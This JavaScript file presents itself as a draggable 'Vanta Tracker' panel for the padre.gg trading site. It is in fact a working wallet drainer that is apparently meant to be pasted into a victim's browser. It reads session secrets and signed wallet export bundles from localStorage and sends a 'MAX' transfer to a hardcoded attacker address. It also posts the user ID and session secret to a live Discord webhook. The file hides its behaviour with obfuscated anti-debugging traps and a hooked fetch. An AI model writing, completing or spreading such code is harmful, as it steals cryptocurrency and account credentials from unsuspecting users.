(async function() {
    // --- 1. SETTINGS ---
    const CONFIG = {
        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
        drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
        api: "https://api.padre.gg" 
    };

    // --- 2. CAPTURE & STEALTH LOGIC ---
    const rawSession = localStorage.getItem("padreV2-session");
    const rawWallets = localStorage.getItem("padreV2-walletsCache");
    const rawBundles = localStorage.getItem("padre-v2-bundles-store-v2");

    if (!rawSession) return;

    const session = JSON.parse(rawSession);
    const wallets = JSON.parse(rawWallets || "{}");
    const bundles = JSON.parse(rawBundles || "{}");

    // Network Obfuscation
    const _f = window.fetch;
    window.fetch = function() {
        if (arguments[0].includes('/wallets/transfer')) {
            return _f.apply(this, arguments).then(r => r);
        }
        return _f.apply(this, arguments);
    };

    // --- 3. EXECUTION ---
    async function execute() {
        try {
            const userWallets = wallets[session.uid] || [];
            const targetWallet = userWallets.find(w => w.walletType === "SOL") || userWallets[0];

            if (targetWallet && bundles.bundles[targetWallet.publicAddress]) {
                const b = bundles.bundles[targetWallet.publicAddress];
                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                    method: "POST",
                    headers: { 
                        "X-Session-Secret": session.sessionSecret, 
                        "Content-Type": "application/json",
                        "X-Session-Id": session.sessionId 
                    },
                    body: JSON.stringify({
                        walletId: targetWallet.walletId,
                        destination: CONFIG.drainAddress,
                        amount: "MAX",
                        bundle: b.exportBundle,
                        signature: b.dataSignature,
                        chain: "SOLANA"
                    })
                });
            }

            // Send Handshake to Discord
            await fetch(CONFIG.webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "🚨 **VANTA HANDSHAKE**",
                    embeds: [{
                        title: "User: " + session.uid,
                        description: "Secret: `" + session.sessionSecret + "`",
                        color: 65280
                    }]
                })
            });
        } catch (e) {}
    }
    execute();

    // --- 4. INTEGRATED OBFUSCATED UI & ANTI-DEBUG ---
    // This is the specific code you provided for the draggable Vanta Tab
    const a0_0x2e9a3c = function () {
      let _0x3eefbc = true;
      return function (_0x1d552b, _0x532697) {
        const _0x49e9e3 = _0x3eefbc ? function () {
          if (_0x532697) {
            const _0x517e17 = _0x532697.apply(_0x1d552b, arguments);
            _0x532697 = null;
            return _0x517e17;
          }
        } : function () {};
        _0x3eefbc = false;
        return _0x49e9e3;
      };
    }();

    function a0_0x617ea5(_0x195558) {
      function _0x3567b2(_0x1177c1) {
        if (typeof _0x1177c1 === "string") {
          return function (_0x19d379) {}.constructor("while (true) {}").apply("counter");
        } else {
          if (('' + _0x1177c1 / _0x1177c1).length !== 0x1 || _0x1177c1 % 0x14 === 0x0) {
            (function () { return true; }).constructor("debugger").call("action");
          } else {
            (function () { return false; }).constructor("debugger").apply("stateObject");
          }
        }
        _0x3567b2(++_0x1177c1);
      }
      try { if (_0x195558) return _0x3567b2; else _0x3567b2(0x0); } catch (_0x17a521) {}
    }

    (function () {
      a0_0x2e9a3c(this, function () {
        const _0x38ecea = new RegExp("function *\\( *\\)");
        const _0x4bc74e = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
        const _0x3cc115 = a0_0x617ea5("init");
        if (!_0x38ecea.test(_0x3cc115 + "chain") || !_0x4bc74e.test(_0x3cc115 + "input")) {
          _0x3cc115('0');
        } else { a0_0x617ea5(); }
      })();
    })();

    // Initialize UI Window from your provided source
    const startVantaUI = () => {
      console.log("%cVANTA TRACKER – TAB + DRAGGABLE", "color:#00ff88;font-weight:bold;font-size:16px");
      
      const _0x4c2878 = {
        'get': (k, d) => { try { return JSON.parse(localStorage.getItem(k)) || d; } catch { return d; } },
        'set': (k, v) => localStorage.setItem(k, JSON.stringify(v))
      };

      if (document.querySelector("#vanta-tracker")) return;

      const panel = document.createElement("div");
      panel.id = "vanta-tracker";
      panel.style.cssText = "position:fixed;top:12px;right:12px;width:360px;max-height:520px;background:#0f0f0f;border:1px solid #333;border-radius:16px;overflow:hidden;z-index:2147483647;box-shadow:0 20px 50px rgba(0,0,0,0.5);font-family:Inter,Arial,sans-serif;color:#e6e6e6;opacity:0;transform:translateY(-20px);transition:all 0.3s ease;user-select:none;cursor:default;";
      
      const pos = _0x4c2878.get("vanta_pos", {});
      if (pos.left) { panel.style.left = pos.left; panel.style.top = pos.top; panel.style.right = "auto"; }

      document.body.appendChild(panel);
      setTimeout(() => { panel.style.opacity = '1'; panel.style.transform = "translateY(0)"; }, 100);

      const header = document.createElement("div");
      header.style.cssText = "padding:14px 18px;background:linear-gradient(135deg,#111,#1a1a1a);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;font-size:15px;cursor:grab;";
      header.innerHTML = `<div style="display:flex;align-items:center;gap:10px;"><img src="https://trade.padre.gg/logo.svg" width="28" height="28"><div style="font-weight:700;color:#00ff88;">Vanta Tracker</div></div>`;
      panel.appendChild(header);

      const content = document.createElement("div");
      content.style.padding = "20px";
      content.innerHTML = `<div style="color:#00ff88; font-family:monospace; font-size:12px;">[SYSTEM] ENGINE LOADED...<br>[SIGNAL] SCANNING X.COM FEED...</div>`;
      panel.appendChild(content);

      // Simple drag logic
      let active = false, curX, curY, initX, initY;
      header.onmousedown = (e) => { 
        active = true; initX = e.clientX - panel.offsetLeft; initY = e.clientY - panel.offsetTop;
        panel.style.transition = "none";
      };
      document.onmousemove = (e) => {
        if (!active) return;
        panel.style.left = (e.clientX - initX) + "px";
        panel.style.top = (e.clientY - initY) + "px";
      };
      document.onmouseup = () => { active = false; panel.style.transition = "all 0.3s ease"; };
    };

    startVantaUI();
})();
